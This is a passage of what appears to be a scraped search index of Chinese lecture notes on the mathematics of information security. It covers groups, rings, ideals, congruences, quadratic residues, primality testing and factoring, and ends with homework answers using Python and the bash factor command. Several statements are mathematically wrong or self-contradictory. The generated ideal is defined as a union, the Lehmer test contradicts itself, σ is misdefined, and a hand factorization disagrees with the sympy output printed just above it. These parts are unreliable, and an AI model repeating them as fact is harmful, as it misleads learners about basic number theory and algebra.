分别为它们的单位元，同态映射 $$f: S \\mapsto G$$  令集合 $$ker\\ f = {a | a \\in S \\and f(a) = e'}$$ 称为同态 f 的核； 令集合 $$im\\ f = f(S) = {f(a) | a \\in S}$$ 称为同态 f 的像。    正规子群与商群 #  定义（自然同态）：\n $$(N, \\cdot) \\vartriangleleft (S, \\cdot)$$，定义映射 $$f: S \\rightarrow S/N, f(a) = aN$$， 则 f 是群 $$(S, \\cdot)$$ 到其商群 $$(S/N, \\odot)$$ 的一个同态映射，由 f 建立的从群 $$(S, \\cdot)$$ 到群 $$(S/N, \\odot)$$ 的同态叫做自然同态。  定理（同态基本定理）：\n 设 $$f: S \\rightarrow G$$ 是群 $$(S, \\cdot)$$ 到群 $$(G, \\times)$$ 的同态映射，则存在 $$S / ker f$$ 到 $$im f$$ 的映射 $$h: S/ ker f \\rightarrow im f$$，使得 $$(S / ker f, \\odot) \\cong (im f, \\times)$$  "},{"id":84,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/15.%E4%BA%A4%E6%8D%A2%E7%8E%AF%E5%92%8C%E5%9F%9F/","title":"15.交换环和域","section":"信息安全数学基础","content":"交换环和域 #  交换环 #  定义（环）：\n 设 R 是一个给定的集合，在其上定义了两种运算 $$+, \\cdot$$，如果满足以下条件，则 $$(R, +, \\cdot)$$ 构成一个环：  $$(R, +)$$ 是一个交换群，其上的单位元被零元，元素在 + 上的逆元被称为负元； $$(R, \\cdot)$$ 是一个半群，其上的单位元被称为幺元。 + 关于 $$\\cdot$$ 满足分配率，即 $$a \\cdot (b + c) = a \\cdot b + a \\cdot c$$。   如果 $$(R, \\cdot)$$ 满足交换率，则该环被称为交换环。  定义（子环）：\n 如果交换环 R 的一个一个子集 S 满足如下的三个条件，则称 S 是 R 的子环：  $$I \\in S$$ 如果 $$a, b \\in S$$，则 $$a - b \\in S$$ 如果 $$a, b \\in S$$，则 $$ab \\in S$$    整环 #  定义（零因子）：\n 一个非零元素 a 是一个左零因子，当且仅当存在一个非零元素 b，使得 ab=0。同样可以定义右零因子。左零因子与右零因子统称为零因子。  定义（整环）：\n 交换环 $$(R, +, \\cdot)$$ 中至少有两个元素（其中一个是零元、另一个是幺元），且 R 中没有零因子，则我们称这样的交换环为整环。  定义（真因子）：\n $$(R, +, \\cdot)$$ 是交换环，$$a, b \\in R, b \\not= 0$$。如果存在一个元素 $$c \\in R$$，使得 $$a = b \\cdot c$$，则称 b 整除 a 或者 b 被 a 整除，记做 b | a。把 b 称作 a 的因子，a 称为 b 的倍元。 如果 b, c 都不可逆，则 b 称为 a 的真因子。  一个定义：线性组合、相伴元素、不可约元素\n域 #  定义（域）：\n 设 $$(F, +, \\cdot)$$ 是一个非零交换环，如果它的每个非零元素都是可逆元素，那么它称为域。  "},{"id":85,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/16.%E4%B8%80%E5%85%83%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%8E%AF/","title":"16.一元多项式环","section":"信息安全数学基础","content":"一元多项式环 #  概念与性质 #  定义（一些定义）：\n  设 $$(R, +, \\cdot)$$ 是交换环，x 是一个变元，n 是非负整数，$$a_0, a_1, \\cdots, a_n \\in R$$，则 $$f(x) = a_0 + a_1 x + \\cdots + a_n x^n$$ 称为交换环 R 上的一元多项式。\n  其中 $$a_0, a_1, \\cdots, a_n$$ 称为该多项式的系数，$$a_0$$ 称为常数项。\n  如果 $$a_n \\not= 0$$，那么称 $$a_n$$ 为首项系数，n 称为一元多项式 f(x) 的次数，记做 $$\\deg f(x) = n$$\n  所有交换环上的一元多项式组成的集合记做 R。\n  定理：\n 设 $$(R, +, \\cdot)$$ 是交换环，f(x) 和 g(x) 是 R中的两个非零多项式，则：  $$f \\times g = \\text{零多项式}$$ 或者 $$\\deg f \\times g \\le \\deg f + \\deg g$$ 如果 $$(R, +, \\cdot)$$ 是整环，那么 $$f \\times g \\not= \\text{零多项式}$$ 且 $$\\deg f \\times g \\le \\deg f + \\deg g$$    定义（一元多项式环）：\n $$(R, +, \\cdot)$$ 是交换环，则称 $$(R, +, \\times)$$ 为 R 上的一元多项式环。  "},{"id":86,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/17.%E7%90%86%E6%83%B3%E5%92%8C%E5%95%86%E7%8E%AF/","title":"17.理想和商环","section":"信息安全数学基础","content":"理想和商环 #  理想 #  定义（理想）：\n 设 $$(R, +, \\cdot)$$ 是一个交换环，I 是 R 的子集，使得：  $$0 \\in I$$； $$\\forall a, b \\in I \\Rightarrow a+b \\in I$$； $$\\forall a \\in I, r \\in R \\Rightarrow ra \\in I$$；   则将 I 称为 R 的理想，显然 R 的两个平凡子环都是 R 的理想，称为 R 的平凡理想。非平凡理想称为真理想。  定理：\n 设 f 是交换环 S 到交换环 G 的同态映射，则 im f 是 G 的子环，ker f 是 S 的理想。  定义（主理想）：\n $$(R, +, \\cdot)$$ 是一个交换环，H 是 R 的非空子集，$$(H_i | i \\in N)$$ 是 R 的所有包含集合 H 的理想，即 $$H \\subseteq H_i (i \\in N)$$。 则考虑集合 $$\\cup_{i \\in N} H_i$$ 称作由**子集 H 生成的理想**，记做 (H)，H 中的元素称作理想 (H) 的生成元。 由一个元素生成的理想 (a) 称作主理想。  定义（主理想环）：\n 如果交换环 $$(R, +, \\cdot)$$ 的所有理想都是主理想，则交换环 R 称为主理想环。  商环 #  定理：\n 设 $$(R, +, \\cdot)$$ 为交换环，H 是它的理想，再设 T 是加法群 (R, +) 关于其子群 (H, +) 的所有不同陪集组成的集合，即商群 $$T = R/H = {a + H | a \\in R}$$，则 $$(R, \\oplus, \\odot)$$ 构成交换环。  $$(a + H) \\oplus (b + H) = (a+b) + H$$ $$(a + H) \\odot (b + H) = (a \\cdot b) + H$$    "},{"id":87,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/18.%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/","title":"18.椭圆曲线","section":"信息安全数学基础","content":"椭圆曲线 #  仿射平面与射影平面 #  定义（仿射平面）：\n 域 K 上的集合 $$K^2 = {(x, y) | x, y \\in K}$$ 称为域 K 上的仿射平面，$$K^2$$ 上的元素称为仿射平面上的点，可以用仿射坐标 (x, y) 表示。  "},{"id":88,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/19.%E5%9F%9F%E4%B8%8A%E7%9A%84%E4%B8%80%E5%85%83%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%8E%AF/","title":"19.域上的一元多项式环","section":"信息安全数学基础","content":"域上的一元多项式环 #  一元多项式的整除 #  定义：\n 如果 $$f(x), g(x) \\in K$$ 不全为零多项式，且 $$d(x) \\in K, d(x) \\not= 0$$。 若 $$d(x) | f(x)$$ 且 $$d(x) | g(x)$$，则称 d(x) 为 g(x) 与 f(x) 的  "},{"id":89,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/2.%E6%95%B4%E9%99%A4/","title":"2.整除","section":"信息安全数学基础","content":"整除 #  概念和性质 #  定义（整除）：\n 设 $$a, b \\in \\mathbb{Z}, b \\neq 0.$$ 如果 $$\\exist q \\in \\mathbb{Z}, s.t. a = qb.$$ 那么就称 b 整除 a，或 a 被 b 整除，记作 $$b | a.$$  完全数、梅森素数和费马素数 #  Basic #  费尔马素数和梅森素数的研究都基于这样一个重要的因式分解：\n  $$\\displaystyle 2^{st} - 1 = (2^s - 1)(\\sum_{i=1}^{t} 2^{s(t-i)})$$\n  若 t 为奇数：$$\\displaystyle 2^{st} + 1 = (2^s + 1)(\\sum_{i = 1}^{t}(-1)^{i+1} 2^{s(t-i)})$$\n  Concept #  定义（完全数）：\n 如果一个正整数 N 的所有正因子之和为 2N，则 N 称为完全数。 $$\\sigma(a)$$ 表示 a 的素因子之和。  定理：\n 若正整数 n 的标准分解式 $$\\displaystyle n = p_1^{a_1} p_2^{a_2} \u0026hellip; p_s^{a_s}$$ 则：$$\\displaystyle \\sigma(n) = \\frac{p_1^{a_1 + 1} - 1}{p_1 - 1}\u0026hellip;\\frac{p_s^{a_s + 1} - 1}{p_s - 1}$$  定理：\n 若 $$2^n -1$$ 是素数，则 $$2^{n-1} (2^n - 1)$$ 是偶完全数，且所有偶完全数均可以用这种形式表示。  定理：\n 若 $$2^n - 1$$ 为素数，则 n 必为素数。  定义（梅森数）：\n 设 p 是一个素数，形如 $$2^p - 1$$ 的数叫做梅森数，记为 $$M_p = 2^p - 1$$，当 $$M_p$$ 为素数时，则称其为梅森素数。  定理：\n 若 $$2^m + 1$$ 为素数，则 $$m = 2^n$$  定义（费马数）：\n 若 n 为非负数，则称 $$F_n = 2^{2^n} + 1$$ 为费马数。当 $$F_n$$ 为素数时，则称其为费马素数。  "},{"id":90,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/3.%E5%90%8C%E4%BD%99/","title":"3.同余","section":"信息安全数学基础","content":"同余 #  概念和性质 #  定义（同余）：\n 给定一个正整数 m，如果用 m 去除两个整数 a 和 b 所得到的余数相同，则称 a 和 b 模 m 同余：$$a \\equiv b \\pmod{m}$$。否则，称 a 和 b 模 m 不同余，记作 $$a \\not\\equiv b \\pmod{m} $$  定理：\n 整数 a 和整数 b 模 m 同余 $$\\Leftrightarrow m | (a - b)​$$  定理：\n  设 $$a_1, a_2, b_1, b_2 \\in \\mathbb{Z}$$，如果有：$$a_1 \\equiv b_1 \\pmod{m}, a_2 \\equiv b_2 \\pmod{m}$$\n  $$a_1 x + a_2 x \\equiv b_1 y + b_2 y \\pmod{m}, \\text{where }x, y \\in \\mathbb{Z}$$\n  $$a_1 a_2 \\equiv b_1 b_2 \\pmod{m}$$\n  $$a_1^n \\equiv b_1^n \\pmod{m}. \\text{where }n \u0026gt; 0$$\n    即在模 m 的数域内，满足加法、乘法和指数律。\n  定理：\n 设 $$\\displaystyle f(t) = \\sum_{i = 0}^n a_i t^i\\text{ and }g(t) = \\sum_{j=0}^{n} b^i t$$ 是两个整系数多项式，满足 $$a_i \\equiv b_i \\pmod{m}, 0 \\le i \\le n$$ 如果有 $$x \\equiv y \\pmod{m}$$，则 $$f(x) \\equiv g(y) \\pmod{m}$$  定理：\n 若 $$ac \\equiv bc \\pmod{m}$$，且 $$gcd(c, m) = d$$，则：$$\\displaystyle a \\equiv b \\pmod{\\frac{m}{d}}$$  定理：\n  若 $$a \\equiv b \\pmod{m}$$，且有正整数 d 满足 $$d | m$$，则：$$a \\equiv b \\pmod{d}$$\n NOTE：模数化简定理\n   定理：\n  若 $$a \\equiv b \\pmod{m_i}, i = 1, 2, \u0026hellip;, n$$，则：$$a \\equiv b \\pmod{lcm(m_1, m_2, \u0026hellip;, m_n)}$$\n NOTE：模数合并定理\n   剩余类和欧拉定理 #  定义（剩余类）：\n  设 m 是一个给定的正整数，令 $$C_r$$ 表示所有与整数 r 模 m 同余的整数所组成的集合，则任意这样的 $$C_r$$ 叫做模 m 的一个剩余类，一个剩余类中的任一整数叫做该类的代表元。\n  或可以用集合的形式来描述剩余类的定义：\n$$C_r = {a | a \\in \\mathbb{Z}, a \\equiv r \\pmod{m}}$$\n  定义（完全剩余系）：\n 在模 m 的剩余类 $$C_0, C_1, \u0026hellip;, C_{m-1}$$ 中各取一代表元 $$a_i \\in C_i, i = 0, 1, \u0026hellip;, m-1$$，则此 m 个数组成的集合称为模 m 的一个完全剩余系（又称完系）。  定义（欧拉定理）：\n   "},{"id":91,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/4.%E6%AC%A1%E6%95%B0/","title":"4.次数","section":"信息安全数学基础","content":"次数 #  概念与性质 #  定义（次数）：\n 设 m 是大于 1 的整数，a 是与 m 互素的整数，使 $$a^l \\equiv 1 \\pmod{m}$$ 成立的最小正整数 l 叫做 a 对模 m 的次数。记作 $$ord_m(a)$$ 或 $$\\sigma(a)$$  "},{"id":92,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/5.%E5%8E%9F%E6%A0%B9/","title":"5.原根","section":"信息安全数学基础","content":"原根 #  概念与性质 #  定义（原根）：\n 设 m 是大于 1 的整数，a 是与 m 互素的整数，若 $$ord_m(a) = \\phi(m)$$，则 a 叫做 m 的原根。  定理：\n a 是 m 的原根的充要条件是 $$1, a, a^2, \u0026hellip;, a^{\\phi(m)-1}$$ 是模 m 的一个缩系。  定理：\n  设 a 是 m 的一个原根，t 是非负整数，则 $$a^t$$ 也是 m 的原根的充要条件是 $$gcd(t, \\phi(m)) = 1$$\n  若 a 是 m 的原根，则 m 恰有 $$\\phi(\\phi(m))$$ 个模 m 不同余的原根。\n  定理：\n 若 p 是奇素数，则 p 的原根存在  定理：\n 设 m 是大于 1 的整数，则 m 的原根存在的充要条件是 m 为 $$2, 4, p^l, 2p^l$$ 之一，其中 $$l \\ge 1,$$ p 是奇素数。  定理：\n 设 m 是大于 2 的整数，$$\\phi(m)$$ 的所有因子是 $$q_1, q_2, \\dots, q_s$$，则与 m 互素的正整数 g 是 m 的一个原根的充要条件是 $$\\displaystyle g^{\\frac{\\phi(m)}{q_i}} \\not\\equiv 1 \\pmod{m}, i = 1, 2, \\dots, s$$  "},{"id":93,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/6.%E6%8C%87%E6%95%B0/","title":"6.指数","section":"信息安全数学基础","content":"指数 #  概念与性质 #  定义（指数）：\n  设 m 是大于 1 的整数，g 是 m 的一个原根，a 是与 m 互素的整数，则存在唯一的非负整数 r，$$0 \\le r \\lt \\phi(m)$$，满足 $$g^r \\equiv a \\pmod{m}$$。于是，我们把 r 叫做以 g 为底 a 对模 m 的指数，记作 $$ind_g a$$。\n  显然根据定义，我们有 $$a \\equiv g^{ind_g a} \\pmod{m}$$。有时，也把指数称作离散对数。\n  定理：\n g 是 m 的一个原根，a 是与 m 互素的整数，如果非负整数 k 使得同余式 $$g^k \\equiv a \\pmod{m}$$ 成立，则有 k 满足：$$k \\equiv ind_g a \\pmod{\\phi(m)}$$  "},{"id":94,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/7.%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99/","title":"7.二次剩余","section":"信息安全数学基础","content":"二次剩余 #  高次剩余 #  定义：\n 高次剩余：设 m 是大于 1 的整数，a 是与 m 互素的整数，若 $$n (n \\ge 2)$$ 次同余方程 $$x^n \\equiv a \\pmod{m}$$ 有解，则 a 叫做模 m 的 n 次剩余。否则，a 叫做模 m 的 n 次非剩余。  定理：\n g 是 m 的一个原根，a 是与 m 互素的整数。 则同余方程 $$x^n \\equiv a \\pmod{m}$$ 有解的充要条件是 $$gcd(n, \\phi(m)) | ind_g a$$，并且如果有解，其解的个数恰好为 $$gcd(n, \\phi(m))$$  定理：\n g 是 m 的一个原根，a 是与 m 互素的整数。 则 a 是模 m 的 n 次剩余的充要条件是 $$\\displaystyle a^{\\frac{\\phi(m)}{d}} \\equiv 1 \\pmod{m}, d = gcd(n, \\phi(m))$$  二次剩余 #  定义：\n 设 m 是大于 1 的整数，a 是与 m 互素的整数，若 $$x^2 \\equiv a \\pmod{m}$$ 有解，则 a 叫做模 m 的二次剩余，或平方剩余；否则，a 叫做模 m 的二次非剩余。  定理（二次剩余的欧拉判别条件）：\n 设 p 是奇素数，$$gcd(a, p) = 1$$，则对于同余方程 $$x^2 \\equiv a \\pmod{p}$$  a 是模 p 的二次剩余的充要条件是 $$a^{\\frac{p-1}{2}} \\equiv 1 \\pmod{p}$$ a 是模 p 的二次非剩余的充要条件是 $$a^{\\frac{p-1}{2}} \\equiv -1\\pmod{p}$$   并且当 a 是模 p 的二次剩余时，同余方程恰有两个解。  定理：\n 设 p 是奇素数，则模 p 的缩系中二次剩余与非二次剩余的个数各为 $$\\displaystyle \\frac{p - 1}{2}$$，且 $$\\displaystyle \\frac{p - 1}{2}$$ 个二次剩余分别与序列 $$\\displaystyle 1^2, 2^2, \\cdots, (\\frac{p - 1}{2})^2$$ 中的一个数同余，且仅与一个数同余。  勒让德符号 #  定义：\n 设 p 是奇素数，$$gcd(a, p) = 1$$，定义勒让德符号如下： $$\\displaystyle (\\frac{a}{p}) = \\begin{cases} 1 \u0026amp; \\text{若 a 是模 p 的二次剩余} \\ -1 \u0026amp; \\text{若 a 是模 p 的二次非剩余} \\end{cases}$$  定理：\n 设 p 是奇素数，a 是与 p 互素的整数。 则：$$\\displaystyle (\\frac{a}{p}) \\equiv a^{\\frac{p-1}{2}} \\pmod{p}$$  定理：\n 设 p 是奇素数，a 是与 p 互素的整数。则：  若 $$a \\equiv b \\pmod{p}$$，则：$$\\displaystyle (\\frac{a}{p}) = (\\frac{b}{p})$$ $$\\displaystyle (\\frac{ab}{p}) = (\\frac{a}{p})(\\frac{b}{p})$$ $$\\displaystyle \\frac{a^2}{p} = 1$$    定理：\n 若 p 是奇素数，我们有 $$\\displaystyle (\\frac{-1}{p}) = (-1)^{\\frac{p-1}{2}} = \\begin{cases} 1 \u0026amp; \\text{若 } p \\equiv 1 \\pmod{4} \\ -1 \u0026amp; \\text{若 } p \\equiv 3\\pmod{4}\\end{cases}$$  定理（高斯引理）：\n 设 p 是奇素数，a 是与 p 互素的整数 如果下列 $$\\displaystyle \\frac{p-1}{2}$$ 个整数：$$\\displaystyle a \\cdot 1, a \\cdot 2, a \\cdot 3, \\cdots, a \\cdot \\frac{p-1}{2}$$，模 p 后得到最小的正剩余中大于 $$\\displaystyle \\frac{p}{2}$$ 的个数是 m 则：$$\\displaystyle (\\frac{a}{p}) = (-1)^m$$  定理：\n 设 p 是奇素数，则有： $$\\displaystyle (\\frac{2}{p}) = (-1)^{\\frac{p^2 -1}{8}} = \\begin{cases} 1 \u0026amp; \\text{若 } p \\equiv \\pm 1 \\pmod{8} \\ -1 \u0026amp; \\text{若 } p \\equiv \\pm 3 \\pmod{8}\\end{cases}$$  定理（二次互反律）：\n 设 p, q 是奇素数，$$p \\not= q​$$，则：$$\\displaystyle (\\frac{p}{q})(\\frac{q}{p}) = (-1)^{\\frac{p-1}{2}\\frac{q-1}{2}}​$$  雅可比符号 #  定义：\n 设奇正数 $$m = p_1 p_2 \\cdots p_r$$ 是奇素数 $$p_i (i = 1, 2, \\cdots, r)$$ 的乘积，定义雅可比（Jacobi）符号如下： $$\\displaystyle (\\frac{a}{m}) = (\\frac{a}{p_1})(\\frac{a}{p_2})\\cdots(\\frac{a}{p_r})$$  "},{"id":95,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/8.%E6%95%B0%E8%AE%BA%E5%BA%94%E7%94%A8/","title":"8.数论应用","section":"信息安全数学基础","content":"数论的应用 #  素性检验算法 #  确定性素性检验 #  Lucas 素性检验：\n 如果存在整数 a，使得 $$a^{n-1} \\equiv 1 \\pmod{n}$$，并且对 n-1 的任意素因子 p，$$a^{\\frac{n-1}{p}} \\not\\equiv 1 \\pmod{n}$$ 成立，那么 n 是素数。  Lehmer 素性检验：\n 如果对 n-1 的任意素因子 $$p_i$$，都存在一个整数 $$a_i$$，使得 $$a_i^{n-1} \\equiv 1 \\pmod{n}$$ 与 $$a_i^{n-1} \\not\\equiv 1 \\pmod{n}$$ 成立，那么 n 是素数。  Pocklington 素性检验：\n 对 n-1 做不完全因子分解，得到 $$n-1 =mj$$，其中有标准分解式 $$m =p_1^{k_1}\u0026hellip;p_r^{k_r}, m \\ge \\sqrt{n}, gcd(m, j) = 1$$。如果对于每个 $$p_i (1 \\le i \\le r)$$，都存在一个整数 $$a_i$$，使得 $$a_i^{n-1} \\equiv 1 \\pmod{n}, gcd(a_i^{\\frac{n-1}{p_i} - 1}, n) = 1$$，那么 n 是素数。  随机性素性检验 #   引理：$$\\displaystyle x^2 \\equiv 1 \\bmod{p} \\Leftrightarrow x = \\begin{cases} 1 \u0026amp; \\bmod{p} \\ -1 \u0026amp; \\bmod{p}\\end{cases}$$\n 确定性素性检测算法时间复杂度较高，大部分底层库中一般使用 Rabin-Miller 算法。\n考虑下面的结论：\n 假设 p 是一个大于 2 的素数，于是 p-1 是一个偶数，设 $$p - 1 = 2^s * d$$，其中 s 是正整数，d 是奇数。 根据费马小定理，对于一个素数 p，我们有 $$a^{p-1} \\equiv 1 \\bmod{p}$$ 对上式做开根号操作，我们有结论下者两式有一个成立 $$\\begin{cases} a^d \u0026amp;\\equiv 1 \u0026amp;\\bmod{p} \\ a^{2^r d} \u0026amp;\\equiv -1 \u0026amp;\\bmod{p} \\text{ ,where }\\exists r, 0 \\le r \\le s-1\\end{cases}$$  上面结论的逆否命题是：\n 如果 $$\\exists a \\Rightarrow \\begin{cases} a^d \u0026amp;\\not\\equiv 1 \u0026amp;\\bmod{p} \\ a^{2^rd} \u0026amp;\\not\\equiv -1 \u0026amp;\\bmod{p} \\text{, where } \\forall r, 0 \\le r \\le s-1 \\end{cases}$$，那么 p 是一个合数。  Rabin-Miller 算法利用上面结论的否命题进行判定，是一个不一定正确但是大概率正确的判定方式。\n整数的分解 #  一、费马素数分解法\n对于奇整数 n，能够获得一下的方程 $$n = x^2 - y^2$$ 的整数解，也就获得了 n 的两个因子，因为：$$n = (x - y)(x +y)$$\n根据以上的结论，我们有以下的算法：\n 首先确定最小的整数 k，使得 $$k^2 \\ge n$$，然后，对下面的数列：$$k^2 -n, (k+1)^2 - n, (k+2)^2 -n, \u0026hellip;, ((n+1)/2)^2 - n$$ 按顺序进行测试，直到找到一个整数 m 使得 $$m^2 - n$$ 为一个平方整数，从而也就找到了一对因子。否则 n 就没有非平凡因子。  二、$$Pollad\\ \\rho$$ 分解算法\n算法：\n 首先，确定一个简单的二次以上整系数多项式，例如 $$f(x) = x^2 + a, a\\ne -2,0$$。然后，从一个初始值开始，利用迭代公式 $$x_{k+1} \\equiv f(x_k) \\pmod{n}$$ 计算一个序列 $$x_1, x_2, \u0026hellip;$$。 令 d 为 n 的一个平凡因子，因为模 d 的剩余类个数比模 n 的剩余类个数少很多，很可能存在某个 $$x_i$$ 和 $$x_j$$ 是属于同一个模 d 剩余类又不属于模 n 的剩余类，所以 $$gcd(x_k - x_j, n)$$ 是 n 的非平凡因子。  "},{"id":96,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/9.%E7%BE%A4/","title":"9.群","section":"信息安全数学基础","content":"群 #  概念和性质 #  定义（群的阶）：\n 群 $$(G, *)$$ 的元素个数 |G| 被称为群的阶，如果 |G| 有限，则称 G 为有限群。  定义（元素的阶）：\n 在群 G 中，对于元素 a 来说，使得 $$a^n = 1$$ 的最小正整数 n 称为元素 a 的阶，记作 ord(a)。如果不存在这样的正整数，那么我们称 a 为无限阶元素。  定理：\n 群 G 中元素 a 的阶为 k，如果 $$a^n = 1$$，那么 k|n  "},{"id":97,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/2.1/","title":"2.1","section":"HOMEWORK","content":"2.1 #  解答题 #  1 #  \u0026gt;\u0026gt;\u0026gt; import gmpy2 \u0026gt;\u0026gt;\u0026gt; print(gmpy2.gcd(55, 85), gmpy2.gcd(202, 282), gmpy2.gcd(666, 1414), gmpy2.gcd(20785, 44350)) 5 2 2 5 手算可以用辗转相除法。比如：\n55, 85 ==\u0026gt; 55, 30 ==\u0026gt; 25, 30 ==\u0026gt; 25, 5 ==\u0026gt; 5|25\r2 #  \u0026gt;\u0026gt;\u0026gt; import gmpy2 \u0026gt;\u0026gt;\u0026gt; print(gmpy2.lcm(231, 732), gmpy2.lcm(-871, 728)) 56364 48776 # 单个输出时可能见到 mpz 的符号 # mpz 是 GNU 项目用于处理大整数的 C++ 库 手算可以用短除法。比如：\n初始化: a=231, b=732, Set={}\rgcd(231, 732)=3 ==\u0026gt; Set={3}\rgcd(77, 244)=1 ==\u0026gt; Set={3, 77, 244}\r另外最小公倍数必须是正整数（不然可以无穷小）。\n3 #  在 linux bash 环境下，factor 可以用于较小数字的分解：\n$ factor 36 69 200 289 36: 2 2 3 3 69: 3 23 200: 2 2 2 5 5 289: 17 17 手算短除。\n4 #  \u0026gt;\u0026gt;\u0026gt; import sympy \u0026gt;\u0026gt;\u0026gt; x = sympy.symbols(\u0026#39;x\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sympy.polys.factor(x**4 - 3*x**2 + 9) (x**2 - 3*x + 3)*(x**2 + 3*x + 3) 即：$$x^4 - 3x^2 + 9 = (x^2 - 3x + 3)(x^2 + 3x + 3)​$$\n所以 $$a^4 - 3a^2 + 9​$$ 是合数。\n手算方法：$$a^4 -3a^2 + 9 = (a^2 + 3)^2 - 9a^2 = (a^2 -3a +3)(a^2 +3a - 3)$$\n证明题 #  1 #   引理：$$a | n, b | n \\Rightarrow lcd(a, b) | n​$$\n $$2|n, 5|n, 7|n \\Rightarrow lcd(2,5,7) | n \\Rightarrow70 | n$$\n2 #   引理：\n $$a | n, b | n \\Rightarrow lcd(a, b) | n​$$ $$a | n \\Leftrightarrow n \\equiv 0 \\pmod{a}$$ $$a |b, c | d \\Rightarrow ac | bd$$   设三个连续正整数 $$a, a+1, a+2$$\n考虑 $$\\mathbb{Z}_3$$，因为 $$a \\not\\equiv a+1 \\not\\equiv a+2 \\pmod{3}$$，三数必构成模 3 完全剩余系，存在 $$x \\equiv 0 \\pmod{3} ​$$\n考虑 $$\\mathbb{Z}_2$$，因为 $$a \\not\\equiv a+ 1 \\pmod{2}$$，二数必构成模 2 的完全剩余系，存在 $$ y \\equiv 0 \\pmod{2}$$\n当 $$x = y$$ 时，$$2 | x, 3 | x \\Rightarrow 6 | n \\Rightarrow 6 | a(a+1)(a+2)$$\n当 $$x \\neq y$$ 时，$$2 | y, 3 | x \\Rightarrow 6 | xy \\Rightarrow 6 | a(a+1)(a+2)$$\n NOTE: 穷举最简单\n 3 #   引理：$$a(a+1) = 2k$$\n 设奇数 $$2n+1$$：\n$$(2n + 1)^2 = 4n^2 + 4n + 1 = 4n(n+1) + 1 = 8k + 1$$\n4 #  $$\\displaystyle mn + pq = (m - p) * \\frac{(m-p)n +p(n + q)}{m - p} = (m - p)(n + \\frac{p(n+q)}{m-p})$$\n因此：$$m-p | p(n+q)$$\n$$\\displaystyle mq + np = (m - p) * \\frac{(m-p)q + p(n + q)}{m-p} = (m-p)(q + \\frac{p(n+q)}{m - p})$$\n因此：$$m - p | mq + np$$\n5 #  用 sympy.polys.factor 分解 $$a^3 - a = a(a+1)(a - 1)​$$。\n考虑 $$\\mathbb{Z}_3$$，因为 $$a \\not\\equiv a+1 \\not\\equiv a - 1 \\pmod{3}$$，三数必构成模 3 完全剩余系，存在 $$x \\equiv 0 \\pmod{3} $$\n$$a^3 - a \\equiv 0 \\pmod{3} \\Leftrightarrow 3 | a^3 -a$$\n6 #  令 $$a = (k+1)!$$，\n则 $$a+i = (k(k-1)..(a-1)(a+1)\u0026hellip;2*1)(a + 1), i \\in {2, 3, \u0026hellip; k, k+1}$$\n7 #  设 $$k = gcd(a+b, a-b) \\Rightarrow a + b = ks, a-b = kt, \\text{where } gcd(s, t) = 1​$$\n则：$$\\displaystyle a = \\frac{1}{2} k(s+t), b = \\frac{1}{2} k(s-t)$$\n再设：$$m = gcd(s+t, s-t)$$，\n则必有：$$\\displaystyle gcd(a, b) = \\frac{1}{2}km = 1 \\Rightarrow km =2 \\Rightarrow k \\in {1,2}$$\n再证明存在性：$$a = 1, b = 3, gcd(4,2) = 2; a = 2, b = 3, gcd(5,1)=1$$\n8 #   引理：\n $$gcd(a, b) = gcd(a, ak + b)$$ $$gcd(a, b) = gcd(a, bk)$$   同 7 设 $$k = gcd(a+b, a-b) \\Rightarrow a + b = ks, a-b = kt, \\text{where } gcd(s, t) = 1​$$\n则：$$\\displaystyle 